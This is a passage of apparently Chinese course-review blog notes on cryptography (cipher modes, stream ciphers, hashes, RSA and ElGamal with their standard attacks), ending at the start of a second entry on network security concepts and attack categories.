/></p><ul><li>可加密任意长度的数据(即不需要进行分组填充)，<strong>没有错误传播</strong>，适于加密冗余度较大的数据、语音和图像数据，但对密文的篡改难以检测</li><li>失去同步是致命的</li></ul><h3 id="ctr"><a class="markdownIt-Anchor" href="#ctr"></a> CTR</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401010036210.png" alt="image-20240101003645101" /></p><p>CTR模式的特点：</p><ol><li>随机访问特性：可以随机的对任意一个密文分组进行解密，对该密文分组的处理与其它密文无关</li><li>高效率：能并行处理; 可以提前进行预处理，这也可以极大的提高处理效率</li><li>可以处理任意长度的数据，而且加解密过程仅涉及加密运算，不涉及解密运算，因此不用实现解密算法</li></ol><h3 id="比较和使用"><a class="markdownIt-Anchor" href="#比较和使用"></a> 比较和使用</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401010037555.png" alt="image-20240101003739450" /></p><table><thead><tr><th>模式</th><th><strong>描述</strong></th><th><strong>特点</strong></th><th><strong>用途</strong></th></tr></thead><tbody><tr><td><strong>ECB</strong></td><td><strong>每个明文组独立地以同一密钥加密</strong></td><td>文明相同，密文相同；操作简单，容易受到重复和代换攻击；无差错传播</td><td>传送短数据(如一个加密密钥)</td></tr><tr><td><strong>CBC</strong></td><td><strong>加密算法的输入是当前明文组和前一密文组</strong></td><td>初始向量IV保密和完整性，密文差错传播</td><td>传输数据分组；认证</td></tr><tr><td><strong>CTR</strong></td><td><strong>加密算法的输入为当前计数器的值，该输出值与当前明文异或以产生密文</strong></td><td>只需加密，没有解密；简单，可预处理，并行处理</td><td>实时性和速度要求比较高的加密场合</td></tr><tr><td><strong>OFB</strong></td><td><strong>与CFB相似，不同之处是本次加密算法的输入为前一次加密算法的输出</strong></td><td>分组密码算法作为一个密钥流产生器，对于密文被篡改难以进行检测</td><td>有挠信道上(如卫星通讯)传送数据流</td></tr><tr><td><strong>CFB</strong></td><td><strong>每次只处理输入的j比特，将上一次密文用作加密算法的输入以产生伪随机输出，该输出与当前明文异或以产生密文</strong></td><td>有差错传播</td><td>传送数据流，认证</td></tr></tbody></table><h1 id="第5章-序列密码"><a class="markdownIt-Anchor" href="#第5章-序列密码"></a> 第5章 序列密码</h1><p>​流密码(也称为序列密码)是模仿一次一密系统的尝试：从一个短的密钥产生一个随机的密钥序列</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011042078.png" alt="image-20240101104249927" /></p><h2 id="分类-2"><a class="markdownIt-Anchor" href="#分类-2"></a> 分类</h2><h3 id="同步序列密码"><a class="markdownIt-Anchor" href="#同步序列密码"></a> 同步序列密码</h3><p>指密钥流的产生需要收发双方进行同步，密钥流完全独立于消息流</p><p>特点：</p><ul><li>无错误传播：各符号之间真正独立。一个传播错误只影响一个符号，不会影响到后继的符号(篡改密文位)</li><li>同步：发送方和接收方必须保持精确的、用同样的密钥并作用在同样的位置上，才能正确解密(插入、删除密文位将导致失去同步，导致解密错误)</li></ul><h3 id="自同步序列密码"><a class="markdownIt-Anchor" href="#自同步序列密码"></a> 自同步序列密码</h3><p>指收发双方中的任何一方，其密钥流的产生依赖于密文流</p><p>特点：</p><ul><li>有限错误传播：设密钥序列产生器具有n位存储，则一个符号的传输错误只影响到后面n符号的解密</li><li>自同步：只要接收方连续收到n个正确的密文符号，密钥序列产生器便会自动地恢复同步</li><li>消除明文统计特性</li></ul><h1 id="第6章-hash函数和消息认证"><a class="markdownIt-Anchor" href="#第6章-hash函数和消息认证"></a> 第6章 Hash函数和消息认证</h1><h2 id="hash函数"><a class="markdownIt-Anchor" href="#hash函数"></a> Hash函数</h2><p>Hash函数(杂凑函数/散列函数)是将任意长的消息M变换为较短的、固定长度的值H(M)的不可逆的单向密码体制</p><h3 id="安全性-2"><a class="markdownIt-Anchor" href="#安全性-2"></a> 安全性</h3><p>敌手的目标：攻击者的主要目标不是<strong>恢复原始的明文</strong>，而是用非法消息替代合法消息进行伪造和欺骗，对哈希函数的攻击也是寻找碰撞的过程，来进行伪造和欺骗</p><h4 id="基本攻击方法"><a class="markdownIt-Anchor" href="#基本攻击方法"></a> 基本攻击方法</h4><ol><li>穷举攻击：能对任何类型的Hash函数进行攻击最典型方法是“<strong>生日攻击</strong>”：给定初值<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mn>0</mn></msub><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>M</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H_{0}=H(M)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span>，寻找<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>M</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo mathvariant="normal">≠</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">M^{\prime}\neq M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，使<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo stretchy="false">(</mo><msup><mi>M</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><msub><mi>H</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">h(M^{\prime})=H_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>密码分析法：依赖于对Hash函数的结构和代数性质分析，采用针对Hash函数弱性质的方法进行攻击。这类攻击方法有<strong>中间相遇攻击、修正分组攻击和差分分析</strong>等</li></ol><h4 id="生日攻击碰撞"><a class="markdownIt-Anchor" href="#生日攻击碰撞"></a> 生日攻击(碰撞)</h4><ul><li>抗弱碰撞–第1类生日问题：假设已经知道A的生日，问至少有多少个人在一起时，至少以1/2的概率使有一个人和A的生日相同？</li><li>抗强碰撞–第2类生日问题：至少有多少个人在一起时，能保证至少以1/2的概率存在2个人有相同的生日？</li><li>假定: 一年有365天，且所有人的生日均匀分布于365天中</li></ul><h2 id="消息认证码"><a class="markdownIt-Anchor" href="#消息认证码"></a> 消息认证码</h2><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011111814.png" alt="image-20240101111101693" /></p><h3 id="主要构造"><a class="markdownIt-Anchor" href="#主要构造"></a> 主要构造</h3><p>基于分组密码</p><p>基于带密钥的Hash函数-HMAC</p><h1 id="第78章-公钥密码体制及签名"><a class="markdownIt-Anchor" href="#第78章-公钥密码体制及签名"></a> 第7/8章 公钥密码体制及签名</h1><h2 id="公钥密码体制"><a class="markdownIt-Anchor" href="#公钥密码体制"></a> 公钥密码体制</h2><h3 id="介绍-2"><a class="markdownIt-Anchor" href="#介绍-2"></a> 介绍</h3><p>对称密码体制中，通信双方共享密钥，因此</p><ol><li>接收方可以伪造原文—不能实现<strong>鉴别认证</strong></li><li>发送方也可以否认—不能实现<strong>不可否认性</strong></li></ol><p>公钥密码(非对称密码)：每个用户都分别拥有两个密钥：加密密钥(公钥)与解密密钥(私钥) ，两者并不相同，且由加密密钥得到解密密钥在计算上不可行。加密密钥是公开的</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011124631.png" alt="image-20240101112412521" /></p><h3 id="单向陷门函数"><a class="markdownIt-Anchor" href="#单向陷门函数"></a> 单向陷门函数</h3><p>单向陷门函数f：</p><ol><li>给出f定义域中的任意元素x,计算f(x)是容易的</li><li>给出y=f(x)中的y，计算x：<ol><li>若知道设计函数f时结合进去的某种信息(称为陷门Trapdoor)，则x容易计算；</li><li>若不知道该陷门信息，则x难以计算</li></ol></li></ol><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011126637.png" alt="image-20240101112611533" /></p><h2 id="数字签名"><a class="markdownIt-Anchor" href="#数字签名"></a> 数字签名</h2><ul><li><p>数字签名的目的：保证<strong>信息的完整性、认证性和不可否认性</strong>，即消息没有被篡改，而且签名也没有被篡改，消息只能始发于所声称的一方。一个完善的签名方案应满足以下三个条件：</p><ul><li>不可否认性：签名者事后不能否认或抵赖自己的签名</li><li>不可伪造性：其他任何人均不能伪造签名，也不能对接收或发送的信息进行篡改、伪造和冒充</li><li>公正的仲裁：若当事双方对签名真伪发生争执时，能通过公正的仲裁者验证签名来确定其真伪</li></ul></li><li><p>以公钥密码为基础的数字签名算法才能具有如此强大的信息安全功能</p></li></ul><h3 id="签名方案一"><a class="markdownIt-Anchor" href="#签名方案一"></a> 签名方案一</h3><ul><li>直接对于消息m进行签名，对事先设定的消息m，签名消息(m，s)具有<strong>身份唯一性</strong>和<strong>不可伪造性</strong></li><li>此时攻击者伪造的签名经过E之后就不是原来的信息，所以需要保证合法签名消息(m,s)中的消息m必须是有意义的明文，而不是乱码</li></ul><h3 id="签名方案二"><a class="markdownIt-Anchor" href="#签名方案二"></a> 签名方案二</h3><ul><li>对消息m进行hash，发送s = D(H(m),k)，验证H(m) = E(s, z)</li></ul><p>两种方案都不能抵抗重放攻击</p><h2 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA</h2><p>该算法的数学基础是初等数论中的<strong>欧拉定理</strong>，其<strong>安全性基于大整数因子分解的困难性</strong></p><h3 id="算法描述"><a class="markdownIt-Anchor" href="#算法描述"></a> 算法描述</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011126840.png" alt="image-20240101112647798" /></p><p>​正确性证明</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011127678.png" alt="image-20240101112706636" /></p><p>​注意素数生成和快速模运算</p><ul><li><p>一般的，选取一个素数的过程如下：</p><ol><li><p>随机选一个奇数n(如使用伪随机数产生器)</p></li><li><p>用某种概率性算法(如Miller-Rabin算法)对n进行一次素性检验，如果n没有通过检验，转到步骤</p></li><li><p>重复步骤2足够多次，如果n都通过了检测，则认为n为素数</p></li></ol></li><li><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011201994.png" alt="image-20240101120103894" /></p></li></ul><h3 id="对rsa的攻击"><a class="markdownIt-Anchor" href="#对rsa的攻击"></a> 对RSA的攻击</h3><ul><li>针对n分解的攻击<ul><li>试除法</li><li>因子分解法</li><li>二次筛法<ul><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011451046.png" alt="image-20240101145115985" /></li></ul></li></ul></li><li>循环攻击<ul><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011451304.png" alt="image-20240101145141251" /></li><li>需要p-1和q-1都有大的素因子</li></ul></li><li>同模攻击</li><li>选择密文攻击<ul><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011502436.png" alt="image-20240101150200380" /></li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011502912.png" alt="image-20240101150210841" /></li></ul></li><li>低加密指数攻击</li><li>时间攻击</li></ul><h3 id="注意事项"><a class="markdownIt-Anchor" href="#注意事项"></a> 注意事项</h3><p>综上所述，使用RSA体制时必须注意以下问题：</p><ul><li>选择素数p和q时，应使其欧拉函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span>的最小公倍数尽可能大(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span> 有大的素因子)。最小公倍数越大，幂剩余函数的周期就越长—<strong>避免循环攻击</strong></li><li>密钥中的各项参数应选得足够大—<strong>避免穷举攻击</strong></li><li>在同一个通信网络中，不同的用户不应该使用共同的模数—<strong>避免同模攻击</strong></li></ul><h3 id="rsa签名"><a class="markdownIt-Anchor" href="#rsa签名"></a> RSA签名</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011638616.png" alt="image-20240101163847527" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011639246.png" alt="image-20240101163925205" /></p><h3 id="对rsa签名的攻击"><a class="markdownIt-Anchor" href="#对rsa签名的攻击"></a> 对RSA签名的攻击</h3><h4 id="不采用hash函数"><a class="markdownIt-Anchor" href="#不采用hash函数"></a> 不采用hash函数</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011702365.png" alt="image-20240101170201310" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011703013.png" alt="image-20240101170343910" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011708556.png" alt="image-20240101170843504" /></p><ul><li>H(M)的另一个作用—加快签名速度对整个消息签名，<ul><li>由于公钥体制速度比较慢，当消息比较长时，签名与验证过程都会相当慢</li><li>对消息的Hash值签名，则无论消息多长，签名都只与Hash值的长度有关</li></ul></li></ul><h2 id="elgamal"><a class="markdownIt-Anchor" href="#elgamal"></a> ElGamal</h2><h3 id="介绍-3"><a class="markdownIt-Anchor" href="#介绍-3"></a> 介绍</h3><ul><li>理解生成元的概念(循环群的生成元，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>r</mi><mi>d</mi><mo stretchy="false">(</mo><mi>g</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="normal">∣</mi><msubsup><mi>Z</mi><mi>p</mi><mo>∗</mo></msubsup><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">ord(g)=|Z^*_p|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.133108em;vertical-align:-0.383108em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mord">∣</span></span></span></span>)</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011600224.png" alt="image-20240101160054116" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011601930.png" alt="image-20240101160102891" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011602320.png" alt="image-20240101160223262" /></p><p>特点：</p><ol><li>非确定性：由于密文依赖于加密过程中用户A选择的随机数r，所以加密相同的明文可能会产生不同的密文—概率加密</li><li>密文空间大于明文空间：明文空间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>Z</mi><mi>p</mi><mo>∗</mo></msubsup></mrow><annotation encoding="application/x-tex">Z^*_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.071804em;vertical-align:-0.383108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span></span></span></span>，而密文空间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>Z</mi><mi>p</mi><mo>∗</mo></msubsup><mo>∗</mo><msubsup><mi>Z</mi><mi>p</mi><mo>∗</mo></msubsup></mrow><annotation encoding="application/x-tex">Z^*_p * Z^*_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.071804em;vertical-align:-0.383108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.071804em;vertical-align:-0.383108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span></span></span></span></li></ol><h3 id="安全性-3"><a class="markdownIt-Anchor" href="#安全性-3"></a> 安全性</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011606275.png" alt="image-20240101160644189" /></p><h3 id="攻击方法"><a class="markdownIt-Anchor" href="#攻击方法"></a> 攻击方法</h3><h4 id="大步-小步法"><a class="markdownIt-Anchor" href="#大步-小步法"></a> 大步-小步法</h4><p><a href="https://www.cnblogs.com/CaCO3/p/16057939.html">【算法笔记】Baby Step Giant Step(BSGS)及其扩展 - CaO氧化钙 - 博客园 (cnblogs.com)</a>–&gt;一个简单理解，但是这里得记住例题</p><p>这里例题看书，它原理的小步和例题的小步不一样，注意这个区别</p><h4 id="指数积分法"><a class="markdownIt-Anchor" href="#指数积分法"></a> 指数积分法</h4><p>不太理解，记住例题。主要是选取合适的素数，若是选不到，可能计算量也很大</p><h3 id="签名方案"><a class="markdownIt-Anchor" href="#签名方案"></a> 签名方案</h3><h4 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011709237.png" alt="image-20240101170940150" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401011709413.png" alt="image-20240101170952361" /></p><h4 id="安全性-4"><a class="markdownIt-Anchor" href="#安全性-4"></a> 安全性</h4><p>书P225</p><ol><li>非确定性数字签名算法，同一消息M的签名依赖于随机数k</li><li>安全性基于有限域上计算离散对数的困难性</li><li>随机数k不能被泄露(已知k可以计算x)</li><li>随机数k不能被重复使用(泄露x)</li><li>多次签名选取的多个k无关联(泄露x)</li><li>不使用Hash函数则易受到攻击</li></ol>]]></content>
    
    
    <categories>
      
      <category>课程复习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网络攻击与防御</title>
    <link href="/posts/40c678cb.html"/>
    <url>/posts/40c678cb.html</url>
    
    <content type="html"><![CDATA[<h1 id="第1章-网络安全的概念与体系结构"><a class="markdownIt-Anchor" href="#第1章-网络安全的概念与体系结构"></a> 第1章 网络安全的概念与体系结构</h1><h2 id="网络安全的概念"><a class="markdownIt-Anchor" href="#网络安全的概念"></a> 网络安全的概念</h2><p>​<strong>网络安全</strong>是指网络系统的硬件、软件及其系统中的数据受到保护，不因偶然的或者恶意的原因而遭受到破坏、更改、泄露，系统连续可靠正常地运行，网络服务不中断。</p><h2 id="网络安全的属性"><a class="markdownIt-Anchor" href="#网络安全的属性"></a> 网络安全的属性</h2><h3 id="基本属性cia-3"><a class="markdownIt-Anchor" href="#基本属性cia-3"></a> 基本属性(CIA)-3</h3><ul><li>机密性：确保信息不会暴露给未授权的实体或者进程，保证保密性的主要措施是密码技术</li><li>完整性：信息在存储或传输中不被蓄意或偶然地破坏的特征，保证完整性的主要措施密码技术和身份认证技术</li><li>可用性：得到授权的实体在需要时可以访问资源或者服务，信息系统不能拒绝服务，讲求时效性，保护措施是访问控制技术</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141325227.png" alt="image-20231214132529120" /></p><h3 id="信息保障与安全参考模型rmias-8"><a class="markdownIt-Anchor" href="#信息保障与安全参考模型rmias-8"></a> 信息保障与安全参考模型(RMIAS)-8</h3><p>​机密性、完整性、可用性、不可抵赖性、隐私性、真实性与可信任性、可说明性、可审计性、</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141326474.png" alt="image-20231214132625436" /></p><h2 id="安全威胁"><a class="markdownIt-Anchor" href="#安全威胁"></a> 安全威胁</h2><p>​**威胁(Threat)**是指任何可能通过未授权的访问、销毁、披露、修改信息以及拒绝服务而对组织或国家产生不利影响的情况或事件</p><h3 id="安全威胁-3"><a class="markdownIt-Anchor" href="#安全威胁-3"></a> 安全威胁-3</h3><ol><li>信息泄露<ul><li>敏感数据在有意或无意中被泄露或丢失</li><li>包括 --&gt; 传输中，存储介质中，建立隐蔽信道窃取</li></ul></li><li>信息破坏<ul><li>以非法手段获得对数据的使用权，删除，修改，插入或重发某些信息，以取得有益于攻击者的响应信息；</li><li>恶意添加、修改数据，以干扰用户的正常使用</li></ul></li><li>拒绝服务<ul><li>执行无关程序使系统响应减慢甚至瘫痪，影响正常用户的使用，甚至使合法用户被排斥而不能得到相应的服务</li></ul></li></ol><h3 id="威胁来源-2"><a class="markdownIt-Anchor" href="#威胁来源-2"></a> 威胁来源-2</h3><ul><li>自然因素<ul><li>包括各种自然灾害、系统环境和场地、电磁干扰、设备老化等</li></ul></li><li>人为因素<ul><li>有意和无意之分；无意，操作、设计失误等；有意，恶意攻击等</li></ul></li></ul><h2 id="网络攻击"><a class="markdownIt-Anchor" href="#网络攻击"></a> 网络攻击</h2><p>​<strong>攻击</strong>指威胁的具体实施</p><h3 id="网络攻击分类"><a class="markdownIt-Anchor" href="#网络攻击分类"></a> 网络攻击分类</h3><h4 id="按安全属性和信息流动情况-5"><a class="markdownIt-Anchor" href="#按安全属性和信息流动情况-5"></a> 按安全属性和信息流动情况-5</h4><ol><li>阻断攻击：拒绝服务攻击，针对可用性的攻击手段，攻击者阻断从信源到信宿的信息流，使信宿无法获取信息</li><li>截取攻击：窃听攻击，攻击者通过物理搭线、拦截数据包、后门、接收辐射信号等方法获取从信源到信宿的信息流</li><li>篡改攻击：非授权者用各种手段对信息系统中的数据进行增加、删除、插入等非授权操作，破坏数据的完整性，以达到其恶意目的</li><li>伪造攻击：伪装攻击，通过出示伪造的凭证来冒充其他对象，进入系统盗窃信息或进行破坏</li><li>重放攻击：当一个消息或部分消息被重复发送时将发生重放攻击</li></ol><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141342597.png" alt="image-20231214134215531" /></p><h4 id="按ccitt的x800标准划分-2"><a class="markdownIt-Anchor" href="#按ccitt的x800标准划分-2"></a> 按CCITT的X.800标准划分-2</h4><ol><li>被动攻击：不影响系统正常工作情况下获取信息</li><li>主动攻击：威胁到信息的完整性，造成信息破坏</li></ol><h2 id="网络安全体系结构"><a class="markdownIt-Anchor" href="#网络安全体系结构"></a> 网络安全体系结构</h2><h3 id="安全服务-5"><a class="markdownIt-Anchor" href="#安全服务-5"></a> 